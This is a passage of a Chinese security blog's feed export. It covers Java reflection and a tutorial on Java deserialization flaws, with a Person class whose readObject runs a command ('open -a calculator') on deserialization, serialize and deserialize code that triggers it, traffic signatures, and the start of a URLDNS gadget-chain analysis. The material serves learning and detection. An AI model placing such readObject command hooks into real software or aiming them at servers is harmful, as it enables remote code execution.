class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor con = c.getConstructor();</span><br><span class="line">        Object obj = con.newInstance();</span><br><span class="line">        <span class="comment">//获取单个方法并使用</span></span><br><span class="line">        <span class="comment">//public Method getMethod(String name,Class&lt;?&gt;... parameterTypes)</span></span><br><span class="line">        <span class="comment">//第一个参数表示的方法名，第二个参数表示的是方法的参数的class类型</span></span><br><span class="line">        Method method = c.getMethod(<span class="string">"show"</span>);</span><br><span class="line">        <span class="comment">//public Object invoke(Object obj,Object... args)</span></span><br><span class="line">        <span class="comment">//返回值是Object接收，第一个参数表示对象是谁，第二个参数表示调用该方法的实际参数</span></span><br><span class="line">        method.invoke(obj); <span class="comment">//本质是调用obj对象的method方法</span></span><br><span class="line">      </span><br><span class="line">      System.out.println(<span class="string">"------------"</span>);</span><br><span class="line">        Method method1 = c.getMethod(<span class="string">"method"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        method1.invoke(obj,<span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"------------"</span>);</span><br><span class="line">        Method method2 = c.getMethod(<span class="string">"getString"</span>, String<span class="class">.<span class="keyword">class</span>, <span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        Object objString = method2.invoke(obj,<span class="string">"elssm"</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(objString);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"------------"</span>);</span><br><span class="line">        Method method3 = c.getDeclaredMethod(<span class="string">"function"</span>);</span><br><span class="line">        method3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        method3.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="几个反射的例子"><a href="#几个反射的例子" class="headerlink" title="几个反射的例子"></a>几个反射的例子</h4><h5 id="通过反射运行配置文件内容"><a href="#通过反射运行配置文件内容" class="headerlink" title="通过反射运行配置文件内容"></a>通过反射运行配置文件内容</h5><p>代码结构如下图</p><p><img src="/2021/09/30/Java反射学习/1.png" alt="1"></p><p><code>class.txt</code>中写的是配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">className = test.Teacher</span><br><span class="line">methodName = love</span><br></pre></td></tr></table></figure><p><code>Student</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">love</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"爱生活，爱学习"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Teacher</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">love</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"爱生活，爱教学"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Worker</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Worker</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">love</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"爱生活，爱工作"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Test</code>类实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//加载键值对数据</span></span><br><span class="line">        Properties prop = <span class="keyword">new</span> Properties();</span><br><span class="line">        FileReader fr = <span class="keyword">new</span> FileReader(<span class="string">"./src/test/class.txt"</span>);</span><br><span class="line">        prop.load(fr);</span><br><span class="line">        fr.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取数据</span></span><br><span class="line">        String className = prop.getProperty(<span class="string">"className"</span>);</span><br><span class="line">        String methodName = prop.getProperty(<span class="string">"methodName"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射</span></span><br><span class="line">        Class c = Class.forName(className);</span><br><span class="line"></span><br><span class="line">        Constructor con = c.getConstructor();</span><br><span class="line">        Object obj = con.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用方法</span></span><br><span class="line">        Method m = c.getMethod(methodName);</span><br><span class="line">        m.invoke(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="通过反射越过泛型检查"><a href="#通过反射越过泛型检查" class="headerlink" title="通过反射越过泛型检查"></a>通过反射越过泛型检查</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayListDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//创建集合对象</span></span><br><span class="line">        ArrayList&lt;Integer&gt; array = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line"></span><br><span class="line">        Class c = array.getClass(); <span class="comment">//集合ArrayList的class对象</span></span><br><span class="line">        Method m = c.getMethod(<span class="string">"add"</span>,Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        m.invoke(array,<span class="string">"hello"</span>); <span class="comment">//调用array的add方法，传入的值是hello</span></span><br><span class="line">        m.invoke(array,<span class="string">"world"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(array);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="通过反射写一个通用的设置某个对象的某个属性为指定的值"><a href="#通过反射写一个通用的设置某个对象的某个属性为指定的值" class="headerlink" title="通过反射写一个通用的设置某个对象的某个属性为指定的值"></a>通过反射写一个通用的设置某个对象的某个属性为指定的值</h5><p>首先写一个实现类<code>Tool</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tool</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setProperty</span><span class="params">(Object obj,String propertyName,Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//根据对象获取字节码文件对象</span></span><br><span class="line">        Class c = obj.getClass();</span><br><span class="line">        <span class="comment">//获取该对象的propertyName成员变量</span></span><br><span class="line">        Field field = c.getDeclaredField(propertyName);</span><br><span class="line">        <span class="comment">//取消访问检查</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//给对象的成员变量赋值为指定的值</span></span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试类<code>ToolDemo</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ToolDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        Tool t = <span class="keyword">new</span> Tool();</span><br><span class="line">        t.setProperty(p,<span class="string">"name"</span>,<span class="string">"elssm"</span>);</span><br><span class="line">        t.setProperty(p,<span class="string">"age"</span>,<span class="number">22</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name + <span class="string">"----"</span> + age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;类的加载&quot;&gt;&lt;a href=&quot;#类的加载&quot; class=&quot;headerlink&quot; title=&quot;类的加载&quot;&gt;&lt;/a&gt;类的加载&lt;/h4&gt;&lt;p&gt;当程序要使用某个类时，如果该类还未被加载到内存中，则系统会通过加载，连接，初始化三步来实现对这个类进行初始化。&lt;/p&gt;
&lt;u
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞基础</title>
    <link href="elssm.github.io/2021/09/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/"/>
    <id>elssm.github.io/2021/09/25/Java反序列化漏洞基础/</id>
    <published>2021-09-25T08:22:41.000Z</published>
    <updated>2021-09-27T01:33:13.636Z</updated>
    
    <content type="html"><![CDATA[<h4 id="序列化与反序列化简介"><a href="#序列化与反序列化简介" class="headerlink" title="序列化与反序列化简介"></a>序列化与反序列化简介</h4><p>序列化是将对象的状态信息转化为可以存储或者传输的形式的过程，一般将一个对象存储到一个存储媒介，在网络传输过程中，可以是字节或者是XML等格式，而字节或者XML格式的可以还原成完全相等的对象，这个过程称之为反序列化。</p><p>java提供了一种对象序列化的机制，在这种机制下，一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。</p><p>将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化。类 <code>ObjectInputStream</code> 和 <code>ObjectOutputStream</code>是高层次的数据流，它们包含反序列化和序列化对象的方法。</p><p>其中<code>ObjectOutputStream</code>类包含很多写方法来写各种数据类型，除了<code>writeObject</code>方法，<code>writeObject</code>方法用于序列化一个对象，并将它发送到输出流。相反对于<code>ObjectOutputStream</code>类中包含一个<code>readObject</code>方法，该方法从流中取出下一个对象，并将对象反序列化，返回值为<code>Object</code>。</p><p>总的来说可以总结为在java中，序列化与反序列化的处理需要以下三步</p><ul><li><code>ObjectOutputStream</code>类中的<code>writeObject</code>方法用来处理需要序列化的对象。</li><li><code>ObjectInputStream</code>类中的<code>readObject</code>方法用来处理反序列化。</li><li>被序列化的类要实现<code>java.io.Serializable</code>接口。</li></ul><p>序列化及反序列化相关接口及类如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java.io.Serializable</span><br><span class="line">java.io.Externalizable</span><br><span class="line">ObjectOutput</span><br><span class="line">ObjectInput</span><br><span class="line">ObjectOutputStream</span><br><span class="line">ObjectInputStream</span><br></pre></td></tr></table></figure><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><ul><li>java环境：jdk1.8.0_191</li><li>电脑系统：macOS Big Sur 11.4</li><li>IDE：IntelliJ IDEA</li></ul><h4 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h4><p>只要服务端反序列化数据，客户端传递类的<code>readObject</code>中代码会自动执行，就会给攻击者在服务器上运行代码的能力。</p><h5 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h5><p>入口类的<code>readObject</code>直接调用危险方法。</p><p>定义一个<code>Person</code>类，并在类中重写<code>readObject</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">",age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先执行序列化代码，其中<code>ObjectOutputStream</code>是对象的序列化流，它的作用是把对象转成字节数据之后输出到文件中保存，对象的输出过程称之为序列化，可以实现对象的持久存储，<code>FileOutputStream</code>被称为文件字节输出流，将输入的内容写入<code>ser.bin</code>文件中，之后通过<code>writeObject</code>来处理对象的序列化。代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"ser.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">"elssm"</span>,<span class="number">22</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在java反序列化传送的包中，一般有两种传送方式，通过这两种方式的流量分析则可判断是否存在java反序列化</p><ul><li>TCP：在16进制流中存在<code>ac ed 00 05</code></li><li>HTTP：base64编码之后存在<code>rO0AB</code></li></ul><p><img src="/2021/09/25/Java反序列化漏洞基础/1.png" alt="1"></p><p>之后执行反序列化代码，其中<code>ObjectInputStream</code>是反序列化流，目的是将之前使用 <code>ObjectOutputStream</code>序列化的原始数据恢复为对象，以流的方式读取对象。 <code>FileInputStream</code>被称为文件字节输入流，读取<code>ser.bin</code>中的内容，之后通过<code>readObject</code>实现对象的反序列化。代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnserializeTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Person person = (Person)unserialize(<span class="string">"ser.bin"</span>);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们传入了一个<code>Person</code>类，并在<code>Person</code>类中重写了<code>readObject</code>方法，因此在反序列化的时候就会执行<code>person</code>类中重写的<code>readObject</code>代码，从而达到命令执行的效果。</p><p><img src="/2021/09/25/Java反序列化漏洞基础/2.png" alt="2"></p><h4 id="URLDNS反序列化漏洞学习"><a href="#URLDNS反序列化漏洞学习" class="headerlink" title="URLDNS反序列化漏洞学习"></a>URLDNS反序列化漏洞学习</h4><p>URLDNS是反序列化时经常会用到的链，通常用于快速检测是否存在反序列化漏洞。当我们想确认服务器是否存在反序列化时，可以通过URL dns解析，如果被解析的话，则可以判断该服务器存在反序列化。在学习该漏洞之前，需要了解一些java反射相关知识。</p><h5 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h5><p>一般情况下，当我们使用某一个类的时候，我们一定是清楚这个类的作用，因此才会对这个类进行实例化。之后使用实例化之后的类对象进行操作。这样的操作可以理解为是“正射”。</p><p>Java的反射(reflection)机制是指在程序的<strong>运行状态中</strong>，可以构造任意一个类的对象，可以了解任意一个对象所属的类，可以了解任意一个类的成员变量和方法，可以调用任意一个对象的属性和方法。这种动态获取程序信息以及动态调用对象的功能称为Java语言的反射机制。</p><h5 id="java反射举例"><a href="#java反射举例" class="headerlink" title="java反射举例"></a>java反射举例</h5><p>一个简单的反射例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">      <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">",age="</span> + age +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//加载Class类对象</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"Person"</span>);</span><br><span class="line">      <span class="comment">//根据 Class 对象实例获取 Constructor 对象，这里获取的是有参构造方法</span></span><br><span class="line">        Constructor perCon = c.getConstructor(String<span class="class">.<span class="keyword">class</span>,<span class="title">int</span>.<span class="title">class</span>)</span>;</span><br><span class="line">      <span class="comment">//通过 Constructor 对象的 newInstance() 方法实例化类对象</span></span><br><span class="line">        Person person = (Person) perCon.newInstance(<span class="string">"elssm"</span>,<span class="number">22</span>);</span><br><span class="line">      System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="java反射API"><a href="#java反射API" class="headerlink" title="java反射API"></a>java反射API</h5><p><img src="/2021/09/25/Java反序列化漏洞基础/17.png" alt="17"></p><h5 id="URLDNS链路分析"><a href="#URLDNS链路分析" class="headerlink" title="URLDNS链路分析"></a>URLDNS链路分析</h5><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line"> *     